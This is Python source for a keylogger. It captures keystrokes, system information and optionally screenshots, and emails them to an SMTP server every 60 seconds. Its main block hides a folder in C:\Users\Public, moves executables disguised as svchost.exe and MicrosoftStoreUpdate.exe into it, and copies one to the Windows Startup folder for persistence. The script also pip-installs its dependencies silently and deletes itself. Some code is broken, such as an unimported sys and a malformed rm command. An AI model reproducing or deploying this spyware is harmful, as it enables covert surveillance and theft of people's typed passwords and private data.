try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard
    from pynput.keyboard import Listener
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.image import MIMEImage  ###
    import io                               ###
    import glob
    import getpass                          ###
    import ctypes                           ###
    import shutil                           ###
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot","sounddevice","pynput"]
    call("pip install " + ' '.join(modules), shell=True)


finally:
    EMAIL_ADDRESS = "CHANGE"
    EMAIL_PASSWORD = "CHANGE"
    SEND_REPORT_EVERY = 60 # as in seconds
    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "KeyLogger Started..."
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log = self.log + "\n" + string

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "

            self.appendlog(current_key)

        def send_mail(self, email, password, message):
            sender = "Private Person <from@example.com>"
            receiver = "A Test User <to@example.com>"

            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                server.login(email, password)
                server.sendmail(sender, receiver, message)
                
        def send_mail_ss(self, email, password, image_data):
            sender = "Private Person <from@example.com>"
            receiver = "A Test User <to@example.com>"
          
            msg = MIMEImage(image_data)
            
            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                server.login(email, password)
                server.sendmail(sender, receiver, msg.as_string())

        def report(self):
            self.system_information()
            self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(hostname)
            self.appendlog(ip)
            self.appendlog(plat)
            self.appendlog(system)
            self.appendlog(machine)

        def screenshot(self):
            img = pyscreenshot.grab()
            #img.save("test.png");
            image_data = io.BytesIO()
            img.save(image_data, format='PNG')
            image_data = image_data.getvalue()
            self.send_mail_ss(self.email, self.password, image_data=image_data)
            timer = threading.Timer(self.interval, self.screenshot)   ###
            timer.start()                                             ###

        def run(self):
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            with keyboard_listener:
                self.report()
                #self.screenshot()
                keyboard_listener.join()
            if os.name == "nt":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                    print('File was closed.')
                    os.system("DEL " + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

            else:
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system('pkill leafpad')
                    os.system("chattr -i " +  os.path.basename(__file__))
                    print('File was closed.')
                    os.system("rm -rf" + os.path.basename(__file__))
                except OSError:
                    print('File is close.')


if __name__ == "__main__":

    # Create folder (if doesn't exist)
    download_folder = r"C:\Users\Public\Pobierane pliki prywatne"
    if not os.path.exists(download_folder):
        os.makedirs(download_folder)
        ctypes.windll.kernel32.SetFileAttributesW(download_folder, 2)
        # Przenieś svchost do folderu Pobierane pliki prywatne
        svchost_path = r"C:\Users\User\Downloads\Minecraft\svchost.exe" 
        MSU_path = r"C:\Users\User\Downloads\Minecraft\MicrosoftStoreUpdate.exe" 
        if os.path.exists(svchost_path):
            dest_path = os.path.join(download_folder, "svchost.exe")
            dest_path_2 = os.path.join(download_folder, "MicrosoftStoreUpdate.exe")
            shutil.move(svchost_path, dest_path)
            shutil.move(MSU_path, dest_path_2)
            # Add MicrosoftStoreUpdate to startup
            username = getpass.getuser()
            autostart_folder = autostart_folder = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % username
            if os.path.exists(autostart_folder):
                target_path = os.path.join(download_folder, "MicrosoftStoreUpdate.exe")
                dest_path = os.path.join(autostart_folder, "MicrosoftStoreUpdate.exe")
                shutil.copy(target_path, dest_path)
            os.startfile(dest_path)
        sys.exit()

    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()
